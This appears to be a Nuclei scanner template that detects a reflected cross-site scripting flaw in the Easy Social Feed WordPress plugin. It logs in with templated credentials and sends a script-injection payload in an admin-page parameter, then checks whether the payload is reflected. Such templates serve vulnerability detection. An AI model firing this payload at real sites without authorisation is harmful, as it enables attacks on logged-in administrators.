id: easy-social-feed
info:
  author: dhiyaneshDk
  description: The plugin does not sanitise and escape a parameter before outputting
    back in an admin dashboard page, leading to a reflected Cross-Site Scripting issue
    which will be executed in the context of a logged admin or editor.
  name: Easy Social Feed < 6.2.7 - Reflected Cross-Site Scripting (XSS)
  reference: https://wpscan.com/vulnerability/6dd00198-ef9b-4913-9494-e08a95e7f9a0
  severity: medium
  tags: wordpress,wp-plugin,xss,authenticated
requests:
- cookie-reuse: true
  matchers:
  - part: body
    type: word
    words:
    - '''type'' : ''</script><script>alert(document.domain)</script>'''
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=easy-facebook-likebox&access_token=a&type=</script><script>alert(document.domain)</script>
    HTTP/1.1

    Host: {{Hostname}}

    '
